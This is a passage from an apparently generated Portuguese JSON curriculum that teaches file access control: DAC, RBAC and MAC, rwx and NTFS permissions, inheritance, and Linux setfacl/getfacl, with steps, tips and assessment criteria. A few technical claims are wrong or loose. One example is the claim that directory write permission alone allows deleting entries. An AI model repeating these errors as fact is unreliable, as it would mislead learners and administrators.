                                    "Compare rigidez com flexibilidade do DAC."
                                  ],
                                  "verification": "Descreva um cenário onde MAC previne vazamento de dados via rótulos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Documentação SELinux Red Hat",
                                    "NIST guia MAC",
                                    "Artigo sobre Bell-LaPadula model"
                                  ],
                                  "tips": "Lembre: no MAC, nem o root pode ignorar políticas de segurança.",
                                  "learningObjective": "Diferenciar MAC por sua imposição central e não-discricionária.",
                                  "commonMistakes": "Confundir MAC com DAC por ambos usarem labels."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar ACLs/DAC com RBAC e MAC",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: flexibilidade, gerenciamento, escalabilidade, uso em SO.",
                                    "Destaque: DAC (ACLs) discricionário vs RBAC roles vs MAC obrigatório.",
                                    "Discuta trade-offs: DAC granular mas caótico; RBAC gerenciável; MAC seguro mas rígido.",
                                    "Analise contextos modernos: ACLs em arquivos, RBAC em apps, MAC em gov/high-sec.",
                                    "Sintetize quando usar cada um em SO como Linux/Windows."
                                  ],
                                  "verification": "Produza uma matriz de comparação com pelo menos 5 critérios (ex: granularidade, auditoria).",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou papel para tabela",
                                    "Resumo comparativo de fontes anteriores"
                                  ],
                                  "tips": "Use cores na tabela: verde para vantagens, vermelho para desvantagens.",
                                  "learningObjective": "Sintetizar diferenças chave e aplicações em SO modernos.",
                                  "commonMistakes": "Ignorar que ACLs podem coexistir com RBAC/MAC em SO híbridos."
                                }
                              ],
                              "practicalExample": "Em um servidor Linux compartilhado: Use ACLs (DAC) para dar permissão de leitura a um usuário específico em um arquivo sensível; aplique RBAC para roles como 'auditor' acessarem logs; ative SELinux (MAC) para bloquear execuções não autorizadas, demonstrando flexibilidade vs controle centralizado.",
                              "finalVerifications": [
                                "Explique em 1 frase a diferença principal entre DAC (ACLs) e MAC.",
                                "Liste 3 vantagens do RBAC sobre ACLs em escala enterprise.",
                                "Identifique um SO moderno que usa ACLs como DAC primário.",
                                "Descreva um risco de usar apenas DAC em ambiente high-security.",
                                "Compare granularidade: ACLs vs RBAC.",
                                "Cite um exemplo real de falha por má escolha de modelo (ex: SolarWinds)."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições de DAC, RBAC e MAC (80%+ correto).",
                                "Qualidade da tabela comparativa: cobertura de pelo menos 5 critérios.",
                                "Capacidade de destacar natureza discricionária das ACLs.",
                                "Inclusão de exemplos práticos em SO modernos.",
                                "Clareza na síntese de trade-offs e aplicações.",
                                "Ausência de confusões comuns entre modelos."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Implementação prática em Linux/Windows.",
                                "Redes e Cloud: RBAC em AWS IAM ou Azure AD.",
                                "Governança e Compliance: NIST frameworks e auditorias.",
                                "Desenvolvimento de Software: Controle de acesso em apps containerizadas."
                              ],
                              "realWorldApplication": "Em equipes de TI, comparar esses modelos ajuda a escolher ACLs para arquivos locais granulares, RBAC para gerenciamento de usuários em empresas, e MAC para compliance em setores regulados como finanças ou defesa, otimizando segurança sem sacrificar usabilidade."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.3.2",
                        "name": "Tipos de Permissões em ACLs",
                        "description": "Categorias de permissões suportadas pelas ACLs, como leitura, escrita, execução e controle total, e sua aplicação específica em objetos do SO.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.2.1",
                            "name": "Classificar permissões básicas (rwx)",
                            "description": "Explicar e exemplificar permissões de leitura (r), escrita (w) e execução (x) em ACLs POSIX e NTFS, incluindo impactos na segurança.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os significados fundamentais das permissões r, w e x",
                                  "subSteps": [
                                    "Defina 'r' (leitura): permite visualizar conteúdo de arquivos ou listar itens em diretórios.",
                                    "Defina 'w' (escrita): permite modificar, criar ou deletar conteúdo dentro de arquivos ou diretórios.",
                                    "Defina 'x' (execução): permite executar arquivos como programas/binários ou acessar/traversar subdiretórios.",
                                    "Diferencie comportamentos para arquivos vs. diretórios (ex: x em diretório permite cd, mas não lista conteúdo sem r).",
                                    "Identifique aplicação universal em POSIX e NTFS, com granularidade variando por SO."
                                  ],
                                  "verification": "Escreva definições de r, w, x e dê um exemplo de diferença arquivo/diretório sem consultar materiais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação oficial POSIX (man chmod)",
                                    "Documentação Microsoft NTFS Permissions",
                                    "Exemplos de saída ls -l no Linux"
                                  ],
                                  "tips": "Use mnemônicos: Read (olhar), Write (escrever), eXecute (rodar). Teste mentalmente em cenários reais.",
                                  "learningObjective": "Classificar precisamente o que cada permissão r, w, x habilita em contextos de arquivo e diretório.",
                                  "commonMistakes": [
                                    "Confundir 'x' com 'r' em diretórios (x permite traversal, r permite listagem).",
                                    "Ignorar que 'w' em diretório permite deletar subitens mesmo sem 'x'."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar permissões rwx em ACLs POSIX (Linux/Unix)",
                                  "subSteps": [
                                    "Execute 'ls -l' para visualizar notação simbólica (ex: rwxr-xr-x) e octal (755).",
                                    "Use 'chmod' simbólico: chmod u+x arquivo (adiciona x para user).",
                                    "Use 'chmod' octal: chmod 644 arquivo (rw-r--r--).",
                                    "Teste permissões: tente cat (r), echo > (w), ./script (x) como user/grupo/outros.",
                                    "Crie usuário/grupo de teste com 'useradd' e 'chown' para simular ACLs."
                                  ],
                                  "verification": "Altere permissões de um arquivo para 755 e demonstre falha de execução como 'other' via terminal.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Terminal Linux/VM (Ubuntu)",
                                    "Arquivo de teste (script echo 'Hello')",
                                    "Comandos: man chmod, man ls"
                                  ],
                                  "tips": "Comece com arquivos simples; pratique octal convertendo binário (r=4, w=2, x=1).",
                                  "learningObjective": "Aplicar e interpretar comandos POSIX para gerenciar rwx em usuários, grupos e outros.",
                                  "commonMistakes": [
                                    "Esquecer herança de diretórios (umask afeta novos arquivos).",
                                    "Confundir owner com group em ls -l."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar permissões rwx equivalentes em ACLs NTFS (Windows)",
                                  "subSteps": [
                                    "Abra Propriedades > Segurança > Editar para ver permissões NTFS (Read, Write, Execute).",
                                    "Mapeie rwx: Read ≈ r, Modify/Write ≈ w, Read&Execute/List Folder Contents ≈ x.",
                                    "Configure permissões granulares: desmarque 'Write' para negar w em um usuário.",
                                    "Teste com contas locais: crie pasta, compartilhe, negue Execute e tente acessar subpasta.",
                                    "Use icacls no CMD para linha de comando: icacls arquivo /grant Users:R (somente leitura)."
                                  ],
                                  "verification": "Configure uma pasta NTFS com 'Read & Execute' para um usuário teste e confirme negação de escrita via Explorer.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Windows 10/11 VM",
                                    "CMD/PowerShell",
                                    "Documentação: docs.microsoft.com NTFS permissions"
                                  ],
                                  "tips": "NTFS é mais granular; foque em 'Traverse Folder/Execute File' para x equivalente.",
                                  "learningObjective": "Mapear e configurar permissões NTFS que correspondam a rwx POSIX.",
                                  "commonMistakes": [
                                    "Ignorar propagação (Apply to subfolders).",
                                    "Confundir Share vs. NTFS permissions (ambos devem permitir)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar impactos na segurança das permissões rwx",
                                  "subSteps": [
                                    "Identifique riscos: 777 (world-writable) permite escalada de privilégios.",
                                    "Discuta mitigações: use princípio least privilege, noexec em /tmp.",
                                    "Exemplo vulnerabilidade: arquivo executável com 644 em diretório world-writable.",
                                    "Compare POSIX vs NTFS: SELinux/AppArmor adiciona camadas além de rwx.",
                                    "Simule ataque: altere permissão para w+x como attacker e execute payload."
                                  ],
                                  "verification": "Descreva 3 riscos de permissões inadequadas e como corrigi-los em POSIX/NTFS.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "OWASP Cheat Sheet Permissions",
                                    "Exemplos CVE (ex: Dirty COW afetado por rwx)",
                                    "Ferramentas: chmod, icacls"
                                  ],
                                  "tips": "Audite com 'find / -perm -002 -type f' para detectar world-writable.",
                                  "learningObjective": "Explicar como configurações rwx incorretas levam a brechas de segurança.",
                                  "commonMistakes": [
                                    "Subestimar 'x' em scripts (leva a execução arbitrária).",
                                    "Achar NTFS 'mais segura' sem ACLs explícitas."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Linux, crie /home/test/script.sh com 'chmod 755'; como usuário 'guest', leia com cat (r ok), mas falhe em echo > (w negado) e ./script.sh (x negado para other). No Windows, crie C:\\test\\file.txt, defina NTFS 'Read & Execute' para 'Users'; teste acesso: abra no Notepad (r ok), mas edite falha (w negado), execute falha se binário.",
                              "finalVerifications": [
                                "Converta rwxr-xr-x para octal (755) e explique cada dígito.",
                                "Liste diferenças chave de rwx em arquivo vs. diretório em POSIX.",
                                "Descreva mapeamento exato de 'Modify' NTFS para w+x.",
                                "Identifique por que 777 é perigoso em produção.",
                                "Simule e corrija uma permissão insegura (ex: chmod 666 -> 644)."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições de r, w, x (100% correto).",
                                "Demonstração prática de comandos POSIX/NTFS sem erros.",
                                "Explicação clara de impactos de segurança com exemplos.",
                                "Uso correto de octal/simbolico e mapeamento cross-OS.",
                                "Identificação de 3+ erros comuns e prevenções.",
                                "Conexão lógica entre teoria e prática em verificações."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Bit de execute essencial para shebangs (#!/bin/bash).",
                                "Redes: Permissões em shares SMB (NTFS) afetam acessos remotos.",
                                "Administração de Sistemas: Integra com SELinux/PowerShell para hardening.",
                                "Ética e Direito: Conformidade com GDPR via controle de acesso.",
                                "Análise Forense: Auditoria de logs de mudanças de permissão."
                              ],
                              "realWorldApplication": "Em ambientes empresariais, sysadmins configuram rwx em servidores web (ex: Apache precisa x em cgi-bin, mas não w) para prevenir injeções; em cloud (AWS EC2), IAM + rwx bloqueiam ransomware; auditores verificam permissões para compliance PCI-DSS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.1.2"
                            ]
                          },
                          {
                            "id": "10.1.6.3.2.2",
                            "name": "Entender permissões avançadas",
                            "description": "Analisar permissões estendidas como traverse folder, delete child ou take ownership em ACLs de Windows, e equivalentes em Linux ACLs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar Permissões Avançadas em ACLs do Windows",
                                  "subSteps": [
                                    "Ler documentação oficial da Microsoft sobre permissões especiais como Traverse Folder, Delete Child, Take Ownership e List Folder.",
                                    "Identificar diferenças entre permissões padrão (Read, Write) e avançadas (ex: Delete Subfolders and Files).",
                                    "Usar o comando icacls para visualizar ACLs em uma pasta de teste e destacar permissões avançadas.",
                                    "Analisar herança de permissões e como elas propagam para subobjetos.",
                                    "Testar aplicação de permissões avançadas via GUI (Propriedades > Segurança) e CLI."
                                  ],
                                  "verification": "Executar icacls /save e confirmar que permissões avançadas como 'F' (Full) e '(OI)' (Object Inherit) aparecem corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Máquina virtual Windows 10/11, documentação Microsoft Docs (icacls), PowerShell.",
                                  "tips": "Sempre use contas de administrador para testes para evitar bloqueios de UAC.",
                                  "learningObjective": "Compreender e identificar 8 permissões avançadas principais em ACLs do Windows.",
                                  "commonMistakes": [
                                    "Confundir Traverse Folder com List Folder; ignorar propagação de herança."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Equivalentes em ACLs POSIX do Linux",
                                  "subSteps": [
                                    "Instalar ferramentas ACL com 'apt install acl' ou equivalente e estudar man pages de getfacl/setfacl.",
                                    "Mapear permissões Windows para Linux: ex. Take Ownership ~ chown, Delete Child ~ rwx em subdiretórios.",
                                    "Executar getfacl em uma pasta para visualizar máscaras, default ACLs e entradas avançadas como 'mask::rwx'.",
                                    "Aplicar ACLs avançadas com setfacl -m u:user:rx /pasta e testar efetividade.",
                                    "Comparar com permissões básicas chmod 755 vs ACLs granulares."
                                  ],
                                  "verification": "Rodar getfacl e setfacl em uma pasta compartilhada, confirmando que um usuário pode 'traverse' sem read no pai.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "VM Linux (Ubuntu/Debian), comandos getfacl/setfacl, man pages.",
                                  "tips": "Use 'setfacl -R' para recursivo, mas teste em diretórios isolados para evitar impactos.",
                                  "learningObjective": "Mapear e aplicar 6 permissões avançadas equivalentes em Linux ACLs.",
                                  "commonMistakes": [
                                    "Esquecer a máscara que limita permissões efetivas; confundir default ACL com efetiva."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar e Contrastar ACLs Windows vs Linux",
                                  "subSteps": [
                                    "Criar tabela comparativa: Traverse Folder (Win) vs execute (Linux), Take Ownership vs chown.",
                                    "Analisar cenários híbridos em ambientes mistos (Active Directory + Samba).",
                                    "Identificar limitações: Windows NTFS mais granular vs Linux POSIX masks.",
                                    "Estudar ferramentas de auditoria como AccessChk (Win) e acltool (Linux).",
                                    "Discutir implicações de segurança em cada SO."
                                  ],
                                  "verification": "Produzir uma tabela Markdown ou Excel com 10 comparações precisas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto/planilha, documentação comparativa (ex: Sysinternals AccessChk).",
                                  "tips": "Foque em efetividade efetiva (effective rights) vs permissões declaradas.",
                                  "learningObjective": "Diferenciar granularidades e riscos entre ACLs de Windows e Linux.",
                                  "commonMistakes": [
                                    "Assumir equivalência 1:1; ignorar contexto de grupos vs usuários."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise de Permissões em Cenários Reais",
                                  "subSteps": [
                                    "Configurar pasta com ACLs complexas no Windows e Linux, aplicando permissões avançadas intencionalmente vulneráveis.",
                                    "Auditar com icacls/getfacl e identificar riscos como 'Delete Child' sem controle parental.",
                                    "Simular ataque: tentar take ownership e mitigar removendo a permissão.",
                                    "Documentar relatório de análise com screenshots e comandos.",
                                    "Testar em VM compartilhada para cenários cross-OS."
                                  ],
                                  "verification": "Gerar relatório de 1 página listando 5 riscos identificados e mitigações.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "VMs Windows/Linux conectadas, ferramentas como icacls, getfacl, AccessChk.",
                                  "tips": "Use snapshots de VM para resetar configurações rapidamente.",
                                  "learningObjective": "Analisar e mitigar riscos de permissões avançadas em ACLs.",
                                  "commonMistakes": [
                                    "Não considerar herança propagada; testar sem contas limitadas."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor de arquivos corporativo Windows, uma pasta compartilhada tem 'Traverse Folder' para um grupo de usuários sem 'List Folder'. Um analista usa icacls para confirmar que usuários podem acessar subpastas diretamente (traverse), mas não listar o conteúdo raiz, prevenindo enumeração de arquivos sensíveis. No Linux equivalente, setfacl concede 'x' (execute) sem 'r' no diretório pai.",
                              "finalVerifications": [
                                "Explicar corretamente 5 permissões avançadas do Windows com exemplos.",
                                "Executar getfacl/setfacl e interpretar saída complexa.",
                                "Identificar risco em ACL híbrida Win/Linux.",
                                "Mapear 4 pares de permissões equivalentes.",
                                "Produzir auditoria básica de uma pasta ACL.",
                                "Demonstrar mitigação de 'Take Ownership'."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de permissões (90% correto).",
                                "Profundidade de substeps executados (todos com evidência).",
                                "Qualidade da tabela comparativa (clareza e completude).",
                                "Relatório prático sem erros conceituais.",
                                "Tempo de conclusão dentro do estimado (±20%).",
                                "Integração de tips para evitar common mistakes."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com NTFS shares em SMB/CIFS.",
                                "Compliance: Alinhamento com NIST SC-07 e CIS benchmarks.",
                                "Programação: Scripting de ACLs com PowerShell/Bash.",
                                "Forense Digital: Análise de logs de eventos de ACL mudanças."
                              ],
                              "realWorldApplication": "Auditorias de segurança em ambientes enterprise, hardening de servidores compartilhados para prevenir escalada de privilégios via permissões mal configuradas, como em incidentes de ransomware explorando 'Delete Child' em backups."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.6.3.2.3",
                            "name": "Avaliar herança de permissões",
                            "description": "Compreender como permissões são herdadas em hierarquias de diretórios e como desabilitar herança para maior granularidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de herança de permissões em ACLs",
                                  "subSteps": [
                                    "Estude a definição de herança: permissões definidas em um diretório pai são propagadas automaticamente para subdiretórios e arquivos filhos.",
                                    "Identifique os tipos de herança: 'Este pasta e subpastas', 'Apenas subpastas e arquivos', 'Apenas esta pasta'.",
                                    "Revise como permissões explícitas sobrescrevem as herdadas.",
                                    "Analise o fluxo de herança de cima para baixo na hierarquia de diretórios.",
                                    "Diferencie herança de permissões NTFS (Windows) versus outros sistemas como Linux."
                                  ],
                                  "verification": "Explique em suas palavras como a herança funciona e dê um exemplo simples de propagação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Microsoft sobre NTFS ACLs",
                                    "Guia de permissões de arquivos do Windows",
                                    "Explorador de Arquivos com aba 'Segurança'"
                                  ],
                                  "tips": "Visualize a herança como uma 'cascata' de permissões do pai para os filhos.",
                                  "learningObjective": "Dominar os fundamentos teóricos da herança de permissões em hierarquias.",
                                  "commonMistakes": [
                                    "Confundir herança com permissões diretas/explícitas",
                                    "Ignorar que permissões negadas bloqueiam heranças permitidas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar herança em uma hierarquia de diretórios real",
                                  "subSteps": [
                                    "Crie uma estrutura de teste: pasta raiz 'Dados', subpasta 'Publico' e subsubpasta 'Privado'.",
                                    "Defina permissões na raiz (ex: Leitura para 'Usuarios').",
                                    "Use o Explorador de Arquivos para visualizar permissões herdadas nas subpastas.",
                                    "Registre as permissões efetivas em cada nível usando 'Propriedades > Segurança > Avançado'.",
                                    "Compare permissões antes e após alterações no pai."
                                  ],
                                  "verification": "Capture screenshots das permissões efetivas em cada pasta e confirme herança.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Máquina Windows com permissões administrativas",
                                    "Explorador de Arquivos",
                                    "Ferramenta icacls no Prompt de Comando"
                                  ],
                                  "tips": "Use 'icacls /save' para exportar ACLs e analisar diferenças.",
                                  "learningObjective": "Visualizar e documentar o comportamento da herança na prática.",
                                  "commonMistakes": [
                                    "Não habilitar 'Exibir permissões avançadas'",
                                    "Esquecer de aplicar a contas de usuário/grupo corretas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar permissões efetivas considerando herança",
                                  "subSteps": [
                                    "Calcule permissões efetivas: combine explícitas + herdadas, priorizando negações.",
                                    "Use a aba 'Permissões efetivas' no Windows para um usuário específico.",
                                    "Teste acesso: tente ler/escrever em arquivos filhos com diferentes contas.",
                                    "Identifique conflitos: onde herança causa acesso indesejado.",
                                    "Documente uma tabela de permissões efetivas por nível hierárquico."
                                  ],
                                  "verification": "Crie um relatório mostrando permissões efetivas para 3 usuários em 3 níveis da hierarquia.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Prompt de Comando com icacls",
                                    "Ferramenta 'Effective Permissions' no Windows",
                                    "Contas de teste de usuário"
                                  ],
                                  "tips": "Sempre teste com contas não-admin para simular cenários reais.",
                                  "learningObjective": "Capacitar-se a calcular e validar permissões reais em cenários herdados.",
                                  "commonMistakes": [
                                    "Ignorar propagação de permissões negadas",
                                    "Não considerar grupos aninhados na herança"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desabilitar herança e configurar granularidade",
                                  "subSteps": [
                                    "Na subpasta alvo, clique em 'Desabilitar herança' nas permissões avançadas.",
                                    "Escolha 'Converter permissões herdadas em explícitas' ou remover.",
                                    "Adicione permissões específicas: ex: negar escrita para certos grupos.",
                                    "Teste acesso pós-desabilitação e confirme isolamento.",
                                    "Reative herança se necessário e compare comportamentos."
                                  ],
                                  "verification": "Demonstre acesso bloqueado na subpasta após desabilitação, com log de tentativas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Explorador de Arquivos avançado",
                                    "icacls para scripts de restauração",
                                    "Contas de usuário de teste"
                                  ],
                                  "tips": "Faça backup das ACLs originais com 'icacls /save acl_backup.txt' antes de desabilitar.",
                                  "learningObjective": "Aprender a quebrar herança para controle fino de acessos.",
                                  "commonMistakes": [
                                    "Não converter herança antes de editar, perdendo configurações",
                                    "Esquecer de propagar para subitens após desabilitação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor corporativo, crie 'C:\\Projetos\\RH' com leitura para 'Departamento RH'. Dentro, 'C:\\Projetos\\RH\\Salarios' herda leitura, mas desabilite herança e defina apenas 'Gerente RH' com escrita, protegendo dados sensíveis sem alterar a pasta pai.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo de herança em uma hierarquia de 3 níveis.",
                                "Calcular permissões efetivas para um usuário em cenário com herança mista.",
                                "Desabilitar herança em uma subpasta e confirmar isolamento de acessos.",
                                "Restaurar herança original sem perda de configurações.",
                                "Identificar e resolver um conflito de permissões herdadas.",
                                "Documentar diferenças entre permissões explícitas e efetivas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação de conceitos de herança (80%+ correto).",
                                "Capacidade de visualizar e documentar permissões em hierarquia real.",
                                "Correta avaliação de permissões efetivas com testes práticos.",
                                "Sucesso em desabilitar herança sem erros ou perdas.",
                                "Análise de granularidade e justificativa de uso.",
                                "Tempo de execução dentro dos estimados com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de ACLs em Active Directory.",
                                "Gestão de Riscos: Mitigação de acessos indevidos em dados sensíveis.",
                                "Auditoria e Compliance: Verificação de conformidade com LGPD/GDPR.",
                                "Redes e Infraestrutura: Integração com compartilhamentos de rede.",
                                "Desenvolvimento Seguro: Proteção de repositórios de código."
                              ],
                              "realWorldApplication": "Em ambientes empresariais, como bancos ou hospitais, desabilitar herança em pastas de dados confidenciais (ex: prontuários médicos) permite granularidade fina, evitando vazamentos enquanto mantém permissões amplas em níveis superiores, alinhando com auditorias de segurança."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.3.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.3.3",
                        "name": "Implementação e Gerenciamento de ACLs",
                        "description": "Ferramentas e comandos para criar, modificar e auditar ACLs em sistemas operacionais reais, com foco em boas práticas de segurança.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.3.1",
                            "name": "Configurar ACLs no Linux com setfacl",
                            "description": "Utilizar comandos como getfacl, setfacl e setfacl -m para definir e visualizar ACLs em arquivos e diretórios no Linux.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Básicos de ACLs e Preparar o Ambiente",
                                  "subSteps": [
                                    "Estude a diferença entre permissões tradicionais (chmod/chown) e ACLs, que permitem controle granular de acesso.",
                                    "Verifique se o suporte a ACLs está ativado no sistema de arquivos (ex: mount com acl).",
                                    "Instale pacotes necessários se ausentes (ex: acl no Debian/Ubuntu via apt install acl).",
                                    "Crie um diretório de teste e usuários de teste (ex: user1, user2 com useradd).",
                                    "Execute mount | grep acl para confirmar suporte."
                                  ],
                                  "verification": "Confirme que getfacl funciona sem erros em um arquivo de teste e que usuários foram criados com id user1.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Sistema Linux com root/sudo access",
                                    "Documentação man setfacl",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": "Use um VM ou container Docker para testes isolados e evite produção.",
                                  "learningObjective": "Compreender o papel das ACLs e preparar ambiente funcional.",
                                  "commonMistakes": [
                                    "Esquecer de ativar ACL no mount",
                                    "Não criar usuários de teste",
                                    "Confundir ACL com permissões POSIX básicas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Visualizar ACLs Existentes com getfacl",
                                  "subSteps": [
                                    "Crie um arquivo ou diretório de teste (ex: mkdir /tmp/testdir; touch /tmp/testdir/file.txt).",
                                    "Execute getfacl /tmp/testdir para ver ACLs padrão.",
                                    "Execute getfacl /tmp/testdir/file.txt e compare com ls -l.",
                                    "Interprete a saída: user::rwx, group::r-x, other::r--, mask::rwx, etc.",
                                    "Salve a saída em um arquivo para análise (getfacl > acl_backup.txt)."
                                  ],
                                  "verification": "Identifique corretamente pelo menos 5 entradas na saída de getfacl em um diretório com ACLs.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Diretório/arquivo de teste",
                                    "Comando getfacl"
                                  ],
                                  "tips": "Use getfacl -e para saída exportável e compare antes/depois de mudanças.",
                                  "learningObjective": "Dominar a visualização e interpretação de ACLs atuais.",
                                  "commonMistakes": [
                                    "Ignorar a máscara que limita permissões efetivas",
                                    "Não notar diferenças entre diretórios e arquivos",
                                    "Executar sem sudo quando necessário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar ACLs Básicas com setfacl -m",
                                  "subSteps": [
                                    "Defina permissão de leitura/escrita para user1: setfacl -m u:user1:rw /tmp/testdir/file.txt.",
                                    "Adicione permissão de execução para group: setfacl -m g:dev:rwx /tmp/testdir.",
                                    "Aplique recursivamente: setfacl -R -m u:user2:rx /tmp/testdir.",
                                    "Verifique com getfacl após cada comando.",
                                    "Teste efetividade logando como user1/user2 e tentando acessar."
                                  ],
                                  "verification": "getfacl mostra as novas entradas e testes de acesso funcionam como esperado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Usuários de teste",
                                    "Comandos setfacl/getfacl"
                                  ],
                                  "tips": "Sempre teste com su - user1 para simular contexto real.",
                                  "learningObjective": "Aplicar modificações básicas de ACLs em arquivos e diretórios.",
                                  "commonMistakes": [
                                    "Esquecer -R para recursivo",
                                    "Usar sintaxe errada (ex: u:user:rx sem rw)",
                                    "Não testar efetividade real"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurações Avançadas e Gerenciamento de ACLs",
                                  "subSteps": [
                                    "Defina ACL padrão para novos arquivos: setfacl -d -m u:user1:rw /tmp/testdir.",
                                    "Ajuste a máscara: setfacl -m m::rx /tmp/testdir.",
                                    "Remova ACL específica: setfacl -x u:user2 /tmp/testdir.",
                                    "Copie ACLs: getfacl -R /tmp/testdir > acl.txt; setfacl --set-file=acl.txt /tmp/otherdir.",
                                    "Backup e restaure ACLs completas."
                                  ],
                                  "verification": "Crie novo arquivo no diretório, execute getfacl e confirme herança/default; remoções funcionam.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Múltiplos diretórios de teste",
                                    "Arquivos de backup ACL"
                                  ],
                                  "tips": "Use --restore para restaurar de backup e -b para remover todas ACLs.",
                                  "learningObjective": "Gerenciar ACLs avançadas incluindo defaults, máscaras e remoções.",
                                  "commonMistakes": [
                                    "Confundir -m (mod) com -d (default)",
                                    "Ignorar impacto da máscara em permissões efetivas",
                                    "Não usar -R em recursivos avançados"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificação Final e Troubleshooting",
                                  "subSteps": [
                                    "Liste todas ACLs com getfacl -R /tmp/testdir.",
                                    "Teste falhas de acesso esperadas (ex: user2 não escreve).",
                                    "Resolva problemas comuns: chmod para reset, umount/remount com acl.",
                                    "Documente configurações em um script shell para automação.",
                                    "Limpe ambiente: setfacl -b -R /tmp/testdir; rm -rf /tmp/testdir."
                                  ],
                                  "verification": "Todos testes passam, documentação completa e ambiente limpo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Scripts shell",
                                    "Logs de comandos"
                                  ],
                                  "tips": "Registre saídas com script > log.txt 2>&1 para debug.",
                                  "learningObjective": "Validar configurações e resolver problemas comuns.",
                                  "commonMistakes": [
                                    "Não limpar ACLs no final",
                                    "Esquecer de testar negações",
                                    "Ignorar erros de montagem"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor de desenvolvimento compartilhado (/var/projects), configure ACLs para permitir que 'devuser' leia/escreva todos arquivos, 'readonlyuser' só leia, aplique recursivamente e defina default para novos arquivos: setfacl -R -m u:devuser:rwx /var/projects; setfacl -R -m u:readonlyuser:r /var/projects; setfacl -d -m u:devuser:rwx /var/projects. Verifique com getfacl e teste acessos.",
                              "finalVerifications": [
                                "getfacl exibe todas ACLs configuradas corretamente sem erros de sintaxe.",
                                "Testes de acesso como usuários específicos funcionam conforme definido.",
                                "ACLs default são herdadas por novos arquivos/diretórios criados.",
                                "Máscara limita permissões efetivas adequadamente.",
                                "Backup e restauração de ACLs preservam configurações.",
                                "Ambiente é limpo sem resíduos de ACLs."
                              ],
                              "assessmentCriteria": [
                                "Configurações sem erros de sintaxe em todos comandos setfacl.",
                                "Interpretação precisa de saídas getfacl (identifica user/group/mask/default).",
                                "Testes reais de permissão confirmam efetividade (sucesso/falha esperados).",
                                "Uso correto de opções avançadas (-R, -d, -m, -x).",
                                "Documentação clara de passos e troubleshooting.",
                                "Tempo total dentro de 2 horas com maestria."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Operacionais: Integra com chown/chmod e SELinux.",
                                "Redes e Servidores: ACLs em NFS/Samba para compartilhamento seguro.",
